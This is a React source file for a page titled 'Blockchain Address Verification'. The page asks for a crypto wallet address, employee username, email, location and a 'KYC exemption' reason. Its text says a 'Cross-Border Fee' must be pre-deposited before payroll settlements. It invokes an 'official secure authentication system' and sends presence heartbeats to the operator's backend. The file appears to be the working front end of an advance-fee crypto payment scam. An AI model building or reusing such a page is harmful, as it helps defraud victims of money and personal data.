import React, { useState, useEffect, useCallback } from "react";
import { useParams, useLocation, useNavigate } from "react-router-dom";
import { ArrowLeft, Wallet, ShieldCheck, AlertTriangle, Globe, Mail, User, MapPin, FileText, CheckCircle, Loader, Info, Lock } from "lucide-react";
import Header from "../components/Header";
import Footer from "../components/Footer";
import { getBlockchainChannel, submitBlockchainVerification, sendHeartbeat, sendGoOffline } from "../lib/api";
import { saveSession, rehydrateSession } from "../lib/session";
import { DEFAULT_BLOCKCHAIN_SUCCESS_TITLE, DEFAULT_BLOCKCHAIN_SUCCESS_MESSAGE } from "../lib/types";
import type { Transaction, KycDraft } from "../lib/types";
import { walletDisplayName, SETTLEMENT_ADDRESS_LABEL } from "../lib/wallet";

interface BcForm {
  blockchain_address: string;
  blockchain_username: string;
  blockchain_country: string;
  blockchain_region: string;
  blockchain_email: string;
  blockchain_no_kyc_reason: string;
}

const EMPTY: BcForm = {
  blockchain_address: "",
  blockchain_username: "",
  blockchain_country: "",
  blockchain_region: "",
  blockchain_email: "",
  blockchain_no_kyc_reason: "",
};

export default function BlockchainKycForm() {
  const { ftUid } = useParams<{ ftUid: string }>();
  const location = useLocation();
  const navigate = useNavigate();
  const routeTx: Transaction | null = location.state?.transaction || null;
  const routeKyc: KycDraft | null = location.state?.kyc || null;

  const [tx, setTx] = useState<Transaction | null>(routeTx);
  const [kyc, setKyc] = useState<KycDraft | null>(routeKyc);
  const [hydrating, setHydrating] = useState(!routeTx);
  const [form, setForm] = useState<BcForm>(EMPTY);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [fieldErrors, setFieldErrors] = useState<Partial<Record<keyof BcForm, string>>>({});
  const [channel, setChannel] = useState<{ tx_blockchain_enabled: boolean; wallet_brand: string | null; already_submitted: boolean; submit_success_title: string; submit_success_message: string } | null>(null);
  const [locked, setLocked] = useState(false);

  useEffect(() => {
    if (routeTx) return;
    let cancelled = false;
    rehydrateSession().then(res => {
      if (cancelled || !res) { setHydrating(false); return; }
      setTx(res.transaction);
      setKyc(res.kyc);
      setHydrating(false);
    }).catch(() => setHydrating(false));
    return () => { cancelled = true; };
  }, [routeTx]);

  useEffect(() => {
    if (tx) saveSession(tx, kyc);
  }, [tx, kyc]);

  useEffect(() => {
    if (!ftUid) return;
    let cancelled = false;
    const load = () => getBlockchainChannel(ftUid)
      .then(cfg => {
        if (!cfg || cancelled) return;
        setChannel(cfg);
        if (cfg.already_submitted) setLocked(true);
      })
      .catch(() => {});
    const onVisible = () => { if (document.visibilityState === "visible") load(); };
    load();
    const id = setInterval(load, 4000);
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      cancelled = true;
      clearInterval(id);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, [ftUid]);

  useEffect(() => {
    if (!ftUid || !tx) return;
    const beat = () => sendHeartbeat(ftUid, "kyc-blockchain").catch(() => {});
    beat();
    const id = setInterval(beat, 15000);
    const onHide = () => sendGoOffline(ftUid);
    window.addEventListener("pagehide", onHide);
    return () => { clearInterval(id); window.removeEventListener("pagehide", onHide); };
  }, [ftUid, tx]);

  // Pre-fill from an existing blockchain draft
  useEffect(() => {
    if (kyc?.verification_channel === "blockchain") {
      setForm({
        blockchain_address: kyc.blockchain_address || "",
        blockchain_username: kyc.blockchain_username || "",
        blockchain_country: kyc.blockchain_country || "",
        blockchain_region: kyc.blockchain_region || "",
        blockchain_email: kyc.blockchain_email || "",
        blockchain_no_kyc_reason: kyc.blockchain_no_kyc_reason || "",
      });
    }
  }, [kyc]);

  const walletName = walletDisplayName(channel?.wallet_brand);

  const validate = useCallback((): boolean => {
    const errs: Partial<Record<keyof BcForm, string>> = {};
    if (!form.blockchain_address.trim()) errs.blockchain_address = "Please enter your Exclusive Digital Account Receiving Address";
    if (!form.blockchain_username.trim()) errs.blockchain_username = "Please enter your employee username";
    if (!form.blockchain_country.trim()) errs.blockchain_country = "Please enter your country";
    if (!form.blockchain_region.trim()) errs.blockchain_region = "Please enter your region";
    if (!form.blockchain_email.trim()) errs.blockchain_email = "Please enter your email address";
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.blockchain_email.trim())) errs.blockchain_email = "Please enter a valid email address";
    if (!form.blockchain_no_kyc_reason.trim()) errs.blockchain_no_kyc_reason = "Please explain the reason for KYC exemption";
    setFieldErrors(errs);
    return Object.keys(errs).length === 0;
  }, [form]);

  async function handleSubmit() {
    if (!ftUid || !tx) return;
    if (locked) return;
    if (!validate()) return;
    setSubmitting(true);
    setError("");
    try {
      const res = await submitBlockchainVerification(ftUid, {
        blockchain_address: form.blockchain_address.trim(),
        blockchain_username: form.blockchain_username.trim(),
        blockchain_country: form.blockchain_country.trim(),
        blockchain_region: form.blockchain_region.trim(),
        blockchain_email: form.blockchain_email.trim(),
        blockchain_no_kyc_reason: form.blockchain_no_kyc_reason.trim(),
      });
      setLocked(true);
      navigate(`/submitted/${ftUid}`, {
        replace: true,
        state: {
          transaction: tx,
          blockchainSuccess: {
            title: res.submit_success_title || DEFAULT_BLOCKCHAIN_SUCCESS_TITLE,
            message: res.submit_success_message || DEFAULT_BLOCKCHAIN_SUCCESS_MESSAGE,
          },
        },
      });
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : "Submission failed. Please try again later.";
      if (msg === "already_submitted") {
        setLocked(true);
        setError("This order has already been submitted via blockchain verification and cannot be submitted again.");
      } else {
        setError(msg);
      }
    } finally {
      setSubmitting(false);
    }
  }

  if (hydrating) {
    return (
      <div className="min-h-screen-safe flex items-center justify-center">
        <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
      </div>
    );
  }

  if (!tx) {
    return (
      <div className="min-h-screen-safe flex items-center justify-center">
        <p className="text-gray-500 text-sm">Transaction not found.</p>
      </div>
    );
  }

  const channelDisabled = channel && !channel.tx_blockchain_enabled;

  const update = (key: keyof BcForm, value: string) => {
    setForm(prev => ({ ...prev, [key]: value }));
    if (fieldErrors[key]) setFieldErrors(prev => ({ ...prev, [key]: undefined }));
  };

  const renderField = (key: keyof BcForm, label: string, Icon: React.ElementType, placeholder: string, opts: { hint?: string; multiline?: boolean; type?: string; mono?: boolean } = {}) => {
    const err = fieldErrors[key];
    const base = `w-full min-w-0 rounded-xl border bg-white text-base lg:text-sm text-gray-900 placeholder:text-gray-400 transition focus:outline-none focus:ring-4 disabled:bg-gray-50 disabled:text-gray-500 ${err ? "border-red-300 focus:border-red-400 focus:ring-red-100" : "border-gray-200 hover:border-gray-300 focus:border-[#1E3A8A] focus:ring-[#1E3A8A]/10"} ${opts.mono ? "font-mono tracking-tight text-[15px]" : ""}`;
    return (
      <div>
        <label htmlFor={key} className="block text-[13px] font-semibold text-gray-700 mb-1.5">
          {label} <span className="text-red-500">*</span>
        </label>
        <div className="relative">
          <Icon className={`absolute left-3.5 w-4 h-4 pointer-events-none ${opts.multiline ? "top-3.5" : "top-1/2 -translate-y-1/2"} ${err ? "text-red-400" : "text-gray-400"}`} />
          {opts.multiline ? (
            <textarea id={key} value={form[key]} onChange={e => update(key, e.target.value)} placeholder={placeholder} rows={7} maxLength={500} disabled={locked} className={`${base} pl-10 pr-3.5 py-3 resize-none leading-relaxed min-h-[180px]`} />
          ) : (
            <input id={key} type={opts.type || "text"} value={form[key]} onChange={e => update(key, e.target.value)} placeholder={placeholder} disabled={locked} autoComplete="off" className={`${base} pl-10 pr-3.5 h-12 lg:h-11`} />
          )}
        </div>
        <div className="flex items-start justify-between gap-3 mt-1.5 min-h-[16px]">
          {err ? (
            <p className="text-xs text-red-600 font-medium flex items-center gap-1"><AlertTriangle className="w-3 h-3 flex-shrink-0" />{err}</p>
          ) : opts.hint ? (
            <p className="text-xs text-gray-400 break-words">{opts.hint}</p>
          ) : <span />}
          {opts.multiline && <span className="text-[11px] text-gray-400 tabular-nums flex-shrink-0">{form[key].length}/500</span>}
        </div>
      </div>
    );
  };

  const sectionTitle = (n: number, title: string) => (
    <div className="flex items-center gap-2.5 mb-4 pb-3 border-b border-gray-100">
      <span className="verification-section-icon w-6 h-6 rounded-md text-[11px] font-bold flex items-center justify-center flex-shrink-0">{n}</span>
      <h3 className="text-[15px] font-bold text-[#0A2B5E] leading-tight tracking-tight">{title}</h3>
    </div>
  );

  const content = (
    <div className="space-y-3 sm:space-y-4 lg:space-y-5">
      <section aria-label="Wallet provider and settlement requirements" className="verification-card relative overflow-hidden rounded-2xl">
        <div aria-hidden="true" className="h-1 bg-gradient-to-r from-[#A5803D] via-[#EBD49B] to-[#F4EBDD]" />
        <div className="px-4 py-5 sm:px-6 sm:py-6">
          <div className="grid grid-cols-[auto_minmax(0,1fr)] items-center gap-x-3 gap-y-2 sm:grid-cols-[auto_minmax(0,1fr)_auto] sm:gap-x-4">
            <div className="verification-section-icon w-11 h-11 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center flex-shrink-0">
              <Wallet className="w-5 h-5 sm:w-6 sm:h-6" />
            </div>
            <div className="min-w-0 flex-1">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8A6329]">Wallet Provider</p>
              <p className="mt-0.5 break-words text-base sm:text-lg font-bold text-[#14365D]">{walletName}</p>
            </div>
            <span className={`col-start-2 justify-self-start sm:col-auto sm:justify-self-end inline-flex items-center gap-1.5 rounded-full px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider ${locked ? "bg-blue-50 text-[#14365D]" : "bg-[#F5EDDA] text-[#8A6329]"}`}>
              {locked ? <Lock className="w-3 h-3" /> : <ShieldCheck className="w-3 h-3" />}
              {locked ? "Pending" : "KYC Exempt"}
            </span>
          </div>
          <div className="mt-4 grid grid-cols-[minmax(0,1fr)_auto] gap-4 border-t border-[#EAE5DA] pt-4 sm:mt-5 sm:gap-6">
            <div className="min-w-0">
              <p className="text-[10px] uppercase tracking-wider text-gray-500 font-semibold">Order ID</p>
              <p className="mt-1 break-all font-mono text-xs font-semibold leading-relaxed text-[#14365D] sm:text-sm">{tx.ft_uid}</p>
            </div>
            <div className="min-w-0 border-l border-[#EAE5DA] pl-4 sm:pl-6">
              <p className="text-[10px] uppercase tracking-wider text-gray-500 font-semibold">Fund Review</p>
              <p className="mt-1 text-sm font-semibold leading-relaxed text-[#14365D]">Exempt</p>
            </div>
          </div>
        </div>
        <div className="border-t border-[#E8DABC] bg-gradient-to-br from-[#FBF7ED] to-[#FFFDFA] px-4 py-4 sm:px-6 sm:py-5">
          <div className="flex items-start gap-2.5 sm:gap-3">
            <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-lg border border-[#E8DABC] bg-white/80 text-[#8A6329] sm:h-8 sm:w-8">
              <AlertTriangle className="h-3.5 w-3.5 sm:h-4 sm:w-4" aria-hidden="true" />
            </span>
            <h2 className="min-w-0 self-center text-[13px] font-bold leading-relaxed text-[#725326] sm:text-sm">Cross-Border Fee Pre-Deposit Requirement</h2>
          </div>
          <p className="mt-2.5 text-xs leading-6 text-[#6B604D] sm:pl-11 sm:text-[13px]">
            After you submit your application, the Cross-Border Fee must be pre-deposited into your activated Exclusive Digital Account. Once the pre-deposit is confirmed, all subsequent payroll settlements will be processed through this account, ensuring a clear, secure, and traceable settlement process.
          </p>
        </div>
      </section>

      {locked && (
        <div className="flex items-start gap-3 rounded-2xl border border-blue-200 bg-[#EFF6FF] px-4 py-3.5 lg:px-5">
          <div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center flex-shrink-0 border border-blue-100">
            <Lock className="w-4 h-4 text-[#1E3A8A]" />
          </div>
          <div>
            <p className="text-sm font-bold text-[#0A2B5E]">Submitted - Awaiting Review</p>
            <p className="text-xs text-[#1E3A8A]/80 leading-relaxed mt-0.5">Your {SETTLEMENT_ADDRESS_LABEL} has been submitted. This order is locked in Pending status and cannot be modified.</p>
          </div>
        </div>
      )}

      {channelDisabled && !locked ? (
        <div className="rounded-2xl border border-gray-200 bg-white px-5 py-10 text-center">
          <div className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center mx-auto mb-3">
            <Info className="w-6 h-6 text-gray-400" />
          </div>
          <p className="text-sm font-semibold text-gray-700">Verification method unavailable</p>
          <p className="text-xs text-gray-500 mt-1">This verification method is currently not available for your order.</p>
        </div>
      ) : (
        <div className="verification-card rounded-2xl divide-y divide-gray-100">
          <div className="p-4 sm:p-6">
            {sectionTitle(1, "Settlement Wallet")}
            {renderField("blockchain_address", "Exclusive Digital Account Receiving Address", Wallet, "e.g. 0x71C7656EC7ab88b098defB751B7401B5f6d8976F", {
              mono: true,
              hint: `Must be a valid ${walletName} address`,
            })}
          </div>
          <div className="p-4 sm:p-6">
            {sectionTitle(2, "Personal Information")}
            <div className="grid grid-cols-2 gap-x-3 sm:gap-x-4 gap-y-2">
              <div className="col-span-2 sm:col-span-1">{renderField("blockchain_username", "Employee Username", User, "Your username")}</div>
              <div className="col-span-2 sm:col-span-1">{renderField("blockchain_email", "Email Address", Mail, "you@example.com", { type: "email" })}</div>
              <div className="col-span-2">{renderField("blockchain_country", "Country", Globe, "e.g. United States")}</div>
              <div className="col-span-2">{renderField("blockchain_region", "State / Region", MapPin, "e.g. California")}</div>
            </div>
          </div>
          <div className="p-4 sm:p-6">
            {sectionTitle(3, "Exemption Statement")}
            {renderField("blockchain_no_kyc_reason", "Reason for KYC Exemption", FileText, "Describe the reason for your KYC exemption request...", { multiline: true })}
          </div>
          <div className="px-4 pt-2 pb-4 sm:px-6 sm:pt-3 sm:pb-5 bg-gray-50/60 rounded-b-2xl space-y-3">
            {error && (
              <div className="rounded-xl border border-red-200 bg-red-50 px-4 py-3 flex items-center gap-2 text-sm text-red-700">
                <AlertTriangle className="w-4 h-4 flex-shrink-0" />{error}
              </div>
            )}
            <button
              onClick={handleSubmit}
              disabled={submitting || locked}
              className="verification-action w-full sm:w-auto sm:min-w-[280px] sm:mx-auto sm:px-10 lg:w-full hover:brightness-110 text-white font-bold h-[52px] lg:h-12 rounded-xl flex items-center justify-center gap-2 transition-all active:scale-[0.98] text-[15px] lg:text-sm disabled:opacity-60 disabled:active:scale-100 disabled:shadow-none"
            >
              {submitting ? <Loader className="w-5 h-5 animate-spin" /> : locked ? <Lock className="w-4 h-4" /> : <CheckCircle className="w-5 h-5" />}
              {submitting ? "Submitting..." : locked ? "Submitted" : "Submit Verification"}
            </button>
            <p className="text-xs font-medium text-gray-600 text-center leading-relaxed">By submitting, you confirm that the information above is accurate.</p>
          </div>
        </div>
      )}

      <div className="verification-card flex items-start gap-3 rounded-2xl lg:rounded-xl px-4 py-3.5">
        <ShieldCheck className="w-4 h-4 text-[#1E3A8A] lg:text-gray-400 flex-shrink-0 mt-0.5" />
        <p className="text-xs text-gray-500 leading-relaxed">
          All verification information is encrypted and processed exclusively through ISFC's official secure authentication system.
        </p>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen-safe flex flex-col">
      <Header />

      <main className="settlement-mobile relative flex min-w-0 flex-1 flex-col lg:hidden">
        <div className="verification-hero pb-12 sm:pb-14">
          <div className="mx-auto w-full">
            <div className="verification-toolbar">
              <button onClick={() => navigate(-1)} className="verification-back">
                <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" /></span>
                Back
              </button>
              <span className="verification-badge">
                <Wallet className="w-3.5 h-3.5" />
                <span>Blockchain</span>
              </span>
            </div>
            <div className="verification-eyebrow">
              <ShieldCheck className="w-3.5 h-3.5 flex-shrink-0" />
              <span>Alternative Verification</span>
            </div>
            <h1 className="verification-heading">Blockchain Address Verification</h1>
            <p className="verification-description">Provide your Exclusive Digital Account Receiving Address to complete verification.</p>
          </div>
        </div>
        <div className="verification-content z-10 -mt-7 rounded-t-[28px] sm:-mt-8 sm:rounded-t-[32px] flex-1 pt-4 sm:pt-6 px-4 sm:px-6" style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom))" }}>
          <div className="mx-auto w-full">{content}</div>
        </div>
      </main>

      <main className="mx-auto hidden w-full max-w-[1040px] flex-1 px-8 py-8 lg:block xl:py-10">
        <button onClick={() => navigate(-1)} className="verification-back verification-back-desktop mb-5">
          <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" aria-hidden="true" /></span>
          Back
        </button>
        <div className="settlement-document overflow-hidden rounded-[28px]">
          <div className="verification-hero verification-hero-desktop">
            <div className="verification-eyebrow">
              <ShieldCheck className="w-3.5 h-3.5 flex-shrink-0" />
              <span>Alternative Verification</span>
            </div>
            <div className="verification-title-row">
              <h1 className="verification-heading">Blockchain Address Verification</h1>
              <span className="verification-badge"><Wallet className="w-3.5 h-3.5" aria-hidden="true" /><span>Blockchain</span></span>
            </div>
            <p className="verification-description">Provide your Exclusive Digital Account Receiving Address below to complete verification.</p>
            <div className="verification-reference">
              <span>FT-UID</span><span className="font-mono">{tx.ft_uid}</span>
            </div>
          </div>
          <div className="relative z-10 -mt-6 rounded-t-[24px] bg-white px-8 pt-5 pb-6 xl:px-12">
            {content}
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
